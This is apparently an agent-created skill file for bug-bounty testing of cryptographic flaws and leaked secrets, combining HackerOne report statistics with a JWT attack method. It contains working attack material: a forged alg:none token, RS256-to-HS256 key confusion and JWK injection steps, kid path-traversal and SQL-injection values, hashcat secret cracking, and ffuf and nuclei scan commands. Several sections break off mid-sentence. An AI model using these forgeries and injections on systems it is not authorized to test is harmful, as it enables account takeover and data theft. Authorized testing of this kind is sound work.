---
name: bbhunt-crypto-and-secrets
description: "Use for weak algorithms, key/JWT confusion, hardcoded secrets, insecure randomness, certificate validation gaps, and credential handling flaws. Unified from 2 upstream skills (h1skills, hunting). Plus evidence from all 15,259 disclosed HackerOne reports. For authorized security testing only."
agent_created: true
---

# Cryptographic Failures and Exposed Secrets — unified methodology

> **Unified skill.** Built from 2 upstream skills across h1skills, hunting and the local HackerOne corpus. Full originals are in `references/upstream-*.md`; the deduplicated union is in `references/unified-method.md`.

## Corpus evidence (562 valid reports, 83 paid / 15%)

Payment is not validity — zero-bounty disclosures are mined as evidence too.

### Techniques ranked across ALL valid writeups

| Technique | Reports |
|---|---:|
| public source-code / repo review | 154 |
| internal service / port / container | 87 |
| JWT / token / base64 decode | 55 |
| subdomain / DNS / cert-transparency recon | 54 |
| race / concurrency / timing | 51 |
| admin / privileged-role context | 50 |
| cache / CDN / unkeyed header | 50 |
| file upload / filename / extension | 49 |
| encoding / double-encode / null byte | 49 |
| HTTP method / verb tampering | 44 |

### Parameters observed

`max-age`, `charset`, `domain`, `name`, `path`, `expires`, `samesite`, `duse_apple_sectrust`, `version`, `random`, `result`, `signature`, `name0`, `headers`, `mode`

### Case studies (real reports, paid and unpaid)

- [340431](https://hackerone.com/reports/340431) Uber — Reflected XSS and sensitive data exposure, including payment details, on lioncityrentals.com.sg ($4000, high)
- [1888803](https://hackerone.com/reports/1888803) Internet Bug Bounty — Use of Cryptographically Weak Pseudo-Random Number Generator in WebCrypto keygen ($4000, high)
- [113288](https://hackerone.com/reports/113288) Internet Bug Bounty — OpenSSL Key Recovery Attack on DH small subgroups (CVE-2016-0701) ($2500, severity n/a)

Full payload bank, bypass frequencies, approach patterns and case-study excerpts: `references/evidence.md`.

## Corpus-backed method (this class)

1. Inventory every signed/encrypted artifact and identify algorithm, key source, and verification path.
2. Decode tokens without trusting them; check alg, kid, exp, nbf, aud, iss and signature verification behaviour.
3. Test algorithm confusion and key/source confusion only where the token is actually consumed for authorization.
4. Search JS, source maps, configs, repos and error output for secrets — then demonstrate what each secret grants access to.
5. Assess randomness by comparing multiple issued tokens for predictable structure or seeded values.
6. Prove a security consequence: forged identity, decrypted data, or access to a protected resource.

### Signals

- JWT, signed URLs, HMAC tokens, API keys, OAuth client secrets
- alg:none or RS256->HS256 confusion opportunities
- Predictable tokens, weak randomness, short secrets
- Certificate validation disabled in a client or integration

### Kill criteria

- Weak crypto in theory only, with no exploitable consequence.
- Secret found but revoked/invalid/unused.
- Certificate issue in a client you cannot influence as an attacker.

### Escalation chains

- JWT confusion -> forged admin identity.
- Client secret -> OAuth token issuance -> data access.
- Predictable reset token -> ATO.

### Veteran tip

Public source-code review and token decoding are the top corpus techniques; always end with a demonstrated capability, not a theoretical weakness.

## Unified upstream methodology (deduplicated)

### Discovery and hunting method

### Quick wins

Start here. These are the highest-yield tests for this class.

- Search JS bundles, mobile apps, and public repos for keys/tokens.
- Check password storage, reset tokens, and encryption modes.
- Test TLS/certificate validation in mobile/thick clients.
- Look for secrets in logs, errors, URLs, and analytics.

### Deeper checklist

- Search JS bundles, mobile apps, and public repos for API keys, tokens, and private keys.
- Check password storage and reset tokens for weak hashing, short entropy, or reuse.
- Test TLS/certificate validation in mobile and thick clients (proxy interception).
- Look for secrets in logs, error messages, URLs, and analytics events.
- Check encryption modes, IV reuse, hardcoded keys, and missing integrity protection.
- Validate that a leaked key is live and scoped to sensitive access before reporting.

### A. Discovery checklist — concrete places, params, headers, flows to look

- Inventory every JWT use: `Authorization: Bearer <token>` headers, session cookies, password-reset/email-verification links, invitation/share links, refresh tokens, and webhook/HMAC signatures. Note where the same token is accepted (which hosts, API versions, mobile clients).
- Decode all three parts with Burp's JWT Editor or `jwt_tool`. In the header record `alg`, `typ`, `kid`, `jku`, `jwk`, `x5u`, `x5t`, `cty`, `crit`; in the payload record `sub`, `user`, `role`, `scope`, `aud`, `iss`, `exp`, `nbf`, `iat`, `org`/`tenant`.
- Locate the verification key: `/jwks.json`, `/.well-known/jwks.json`, `/openid-connect/certs`, static PEM files, JS bundles, GitHub repos, and error messages leaking library/version. Also check whether the app ships the *secret* to the browser (strong sign of client-side verification).
- Identify the library/version from stack traces or headers and map to recent CVEs — e.g. CVE-2026-22817 (Hono JWT middleware algorithm confusion when the selected JWK has no explicit `alg`), CVE-2026-29000 (`none` in JWE implementations), CVE-2015-9235 lineage.
- Check the full lifecycle: token in URL/Referer/history, in `localStorage`/`sessionStorage`, whether the resource server re-verifies on every request, and whether revocation (`/logout`, password change) is enforced server-side for self-contained JWTs.

- Check whether the JWT is accepted across multiple services with different expectations: the same token for API A and admin API B may only validate `exp` in one service — audience confu

### Signals and surfaces

### Signal

- Reports: **562** · paid: **83**
- Median bounty **$500** · p90 **$2,500** · max **$6,909** · total **$84,616**
- Median upvotes **8**

### Where it pays

| Program | Reports | Bounty | Upvotes |
|---|---|---|---|
| Internet Bug Bounty | 34 | $21,500 | 625 |
| GitHub Security Lab | 10 | $17,200 | 95 |
| Uber | 8 | $12,750 | 491 |
| Dropbox | 2 | $7,125 | 57 |
| X / xAI | 15 | $2,940 | 258 |
| Mail.ru | 4 | $2,650 | 86 |
| Nextcloud | 36 | $2,350 | 534 |
| Slack | 3 | $2,350 | 229 |

### Where to look

Parameters, endpoints, and fields that commonly carry this bug:

`js` `env` `config` `logs` `mobile` `repo` `backup`

### Techniques, payloads and bypasses

### Payloads & probes

- Regex -> `AKIA[0-9A-Z]{16}`, `AIza[0-9A-Za-z_-]{35}`, `ghp_[0-9A-Za-z]{36}`
- JWT secret -> `hashcat -m 16500`
- Weak reset token -> timestamp/random seed

### Bypass tricks

- Check base64/hex-obfuscated keys in bundles.
- Look at source maps and CI artifacts for env files.
- Test key scope before reporting.

### Techniques from real reports

One concrete lesson per report (mined from the writeup), newest and most-upvoted first. Read 5–10 before testing.

- **JumpCloud API Key leaked via Open Github Repository.** — `#716292` · Starbucks · $0 · ▲739
  > File: [https://github.com/████/Project/blob/0d56bb910923da2fbee95971778923f734a25f68/getSystemUsers.go](https://github.com/████/Project/blob/0d56bb910923da2fbee95971778923f734a25f68/getSystemUsers.go)
- **Github Token Leaked publicly for https://github.sc-corp.net** — `#396467` · Snapchat · $0 · ▲582
  > https://github.com/█████/leetcode/blob/0eec6434940a01e490d5eecea9baf4778836c54e/TopicMatch.py
- **Reflected XSS and sensitive data exposure, including payment details, on lioncityrentals.com.sg** — `#340431` · Uber · $4,000 · ▲376
  > And be sure to check out my blog https://healdb.tech/blog/ or my twitter https://twitter.com/heald ben
- **Reset any password** — `#703972` · pixiv · $0 · ▲313
  > 1.input the email [reset password url](https://www.pixiv.net/reminder.php).
- **Infromation Disclosure To Use of Hard-coded Cryptographic Key** — `#2353237` · Reddit · $0 · ▲238
  > [ I discovered this link while I was conducting a survey and collecting information, and I discovered it when I visited this link https://www.reddit.com/?rdt=49420 after logging into my account, as I will explain in pictures using the Trufflehog tool.
- **Key Reinstallation Attacks: Breaking WPA2 by forcing nonce reuse** — `#286740` · Internet Bug Bounty · $0 · ▲191
  > [The Wi-Fi Alliance](https://www.wi-fi.org/news-events/newsroom/wi-fi-alliance-security-upda

### Payload fragments observed

Recurring payloads from this class's writeups. Adapt, don't paste blindly.

| Seen | Fragment |
|---:|---|
| 7× | `SecTrustSetOCSPResponse()` |
| 7× | `hsts_check()` |
| 6× | `$position` |
| 6× | `ssl_peer_key_build()` |
| 5× | `ossl_apple_verify()` |
| 5× | `hsts_add_host_expire()` |
| 5× | `Curl_hsts_parse()` |
| 4× | `master @ 3ad4a5ee8` |
| 4× | `Curl_ossl_check_peer_cert()` |
| 4× | `verifystatus()` |
| 4× | `SSL_get_tlsext_status_ocsp_resp()` |
| 4× | `gnutls_certificate_verify_peers2()` |
| 4× | `Math.random()` |
| 4× | `EntropySource()` |
| 4× | `Curl_fopen()` |
| 4× | `Curl_vtls_apple_verify()` |
| 4× | `$passPhrase` |
| 4× | `$version` |
| 4× | `OC\Security\SecureRandom::generate` |
| 4× | `hsts_create()` |

### B. Techniques & bypasses — specific actionable techniques/payload shapes

- `alg:none`: set header `{"alg":"none","typ":"JWT"}` (try `None`, `NoNe`, casing variants), elevate `role`/`sub`, strip the signature but KEEP the trailing dot: `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.` Missing-signature variant: send only header.payload with no third segment.
- RS256→HS256 key confusion: change `alg` to `HS256`, keep payload, sign with the server's public key as the HMAC secret. The key must be *byte-identical* to the server's copy (same PEM/X.509 format, same newlines). Convert JWK→PEM via JWT Editor's New RSA Key → PEM radio → Base64 → New Symmetric Key `k`. Automate with `jwt_tool -X a`.
- No exposed public key? Derive `n` from two existing tokens with `docker run --rm -it portswigger/sig2n <token1> <token2>` (or `jwt_forgery.py` from `rsa_sign2n`); only one candidate `n` is accepted — replay each forged token until one works.
- JWK injection (CVE-2018-0114): generate your own RSA pair, embed it in `jwk` with a matching `kid`, set `alg: RS256`, sign with your private key. Header shape: `{"alg":"RS256","kid":"example-key-id","jwk":{"kty":"RSA","kid":"example-key-id","use":"sig","n":"...","e":"AQAB"}}`. Try `jku`/`x5u` pointing at a JWKS you host (`jwt_tool -X s`).
- `kid` path traversal: `{"alg":"RS256","kid":"../../../dev/null"}` — sign with `/dev/null` so the server loads the same predictable "key". `kid` SQLi: `"kid": "x' UNION SELECT 'pwned_secret'-- -"` then HMAC-sign with `pwned_secret`. Also try command-injection shapes like `key1|/

### Validation and proof

### Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.

### Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.

---

<!-- ============ PART 2: BUG HUNTER METHODOLOGY (execution + validation) ============ -->

# HUNT-JWT-CRYPTO — Forgeable JSON Web Tokens (A04 Cryptographic Failures)

### Validation discipline

- Decode and confirm the token you sent actually carries the edited claims.
- The win is **cross-identity data access**, not merely a 200. Show the foreign
  user data (e.g. other users' emails) in the response.
- `alg:none` rejected (401) just means that flaw is patched — try key confusion
  before concluding the app is safe.

### C. Validation / proof bar — how to confirm and avoid false positives

- The win is **cross-identity data access or an admin-only action**, not merely a 200 or a decoded admin claim. Show another user's data / a privileged state change resulting from the forged token.
- Decode the *exact* token you sent and confirm the edited claims and `alg` actually reach the server; resource servers must validate signature, issuer, audience, expiration, and algorithm independently of the token header.
- For key confusion, a 401 usually means the byte representation differs — retry with alternate PEM formatting/newlines before concluding it is patched; `alg:none` 401 likewise only rules out that one primitive.
- For derived-key attacks, only one candidate `n` should work; do not report "algorithm confusion" based on a local forgery the server never accepted.
- A JWT secret found in client-side code is only a finding if you demonstrate the server accepts a token signed with it — do not report "secret in bundle" as standalone if verification is server-side with a different key.
- Missing best practices (PII in JWT payload, long expiry) are usually Informational; chain them to a concrete access-control break. Redact tokens and victim PII in the PoC.

- Verify the target actually uses JWTs for authentication (not just for a share link) — a forged token for a low-value share link is a different finding.
- Show a *cross-identity* result: another user's data, an admin action, or access to a different tenant. A 200 on `/me` with your own data is not the win.
- For algorithm confusion, confirm 

### Escalation and related chains

### Escalation chains

- Leaked key -> cloud access.
- Weak crypto -> token forgery.

### Tools and wordlists

### Tools

`trufflehog` · `gitleaks` · `hashcat` · `jwt_tool` · `nuclei`

### Wordlists

Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.

| File | Entries |
|---|---:|
| `~/.local/share/hackerone-reports/wordlists/paths_crypto-and-secrets.txt` | 150 |
| `~/.local/share/hackerone-reports/wordlists/params_crypto-and-secrets.txt` | 77 |
| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |
| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |

```sh
W=~/.local/share/hackerone-reports/wordlists
ffuf -u https://target/FUZZ -w $W/paths_crypto-and-secrets.txt \
     -mc all -fc 404 -fs 0 -rate 40
ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_crypto-and-secrets.txt \
     -mr 'canary|error|invalid|not found' -rate 40
```

### Nuclei

Verify leaked keys before reporting; check scope and whether the key is live.

```sh
nuclei -u https://target -tags exposure,keys,tokens,ssl \
       -severity info,low,medium,high,critical -rl 40 -o nuclei_crypto-and-secrets.txt
nuclei -u https://target -t ~/nuclei-templates/http/exposures/tokens \
       -rl 40 -o nuclei_crypto-and-secrets_tokens.txt
nuclei -u https://target -t ~/nuclei-templates/http/exposures/configs \
       -rl 40 -o nuclei_crypto-and-secrets_configs.txt
# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'
```

Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.

### Forging the token (never hand-encode base64 — use a JWT tool)

Use a purpose-built tool so encoding/signing is correct: **jwt_tool**
(`jwt_tool <token> -T` to tamper interactively, `-X a` for alg:none, `-X k -pk
public.pem` for key confusion), Burp's **JWT Editor** extension, or a few lines
of **PyJWT**. Each forge below is the concept plus the claim to edit.

**alg:none — become admin / another user**
```
header:    {"alg":"none","typ":"JWT"}
payload:   {"data":{"id":1,"email":"admin@target.example","role":"admin"}}
signature: (empty — keep the trailing dot:  header.payload. )
```
Some verifiers reject lowercase `none` but accept `None`/`NONE`/`nOnE` — try case variants.

**RS256 → HS256 key confusion — once you have the RSA public key**
```
1. Obtain the server's RSA public key as PEM. Sources: /jwks.json or
   /.well-known/jwks.json (convert the JWK to PEM), a public-key file in the JS
   bundle, or recover it from two captured tokens (e.g. jwt_tool / rsa_sign2n).
2. Re-sign an EDITED payload with HS256, using that PEM as the HMAC secret:
      jwt_tool <token> -X k -pk public.pem
   payload edit:  {"sub":"administrator"}   (or role:"admin" / another user's id)
```

**kid header injection — verifier loads the HMAC key from a FILE named by `kid`**
```
header:  {"alg":"HS256","kid":"../../../../../../../dev/null"}
secret:  ""     (contents of /dev/null = empty string → sign HS256 with an empty secret)
payload: {"sub":"administrator"}
```
Traverse out of the keys directory first. `kid` can also carry SQLi / command
injection / SSRF if the key lookup hits a DB / shell / 

## Source skills merged into this topic

- `h1skills` — `hackerone-crypto-and-secrets`
- `hunting` — `crypto-and-secrets`

## References

- `references/unified-method.md` — complete deduplicated union of all upstream sections
- `references/upstream-*.md` — full original SKILL.md from each contributing repo
- `references/upstream-assets/` — 2 companion files (payload/technique references, scripts, validators and schemas) from the contributing skills
- `references/unified-method.md` — includes 2 merged companion methodology documents
- `references/corpus-wordlists/` — 2 mined paths/params/payload lists from the HackerOne corpus
- `../../upstream/` — complete unmodified archives of all five source repositories
- `references/evidence.md` — corpus technique frequencies, parameters, case studies and payload bank
- `bbhunt-methodology` — orchestrator, state machine and class router
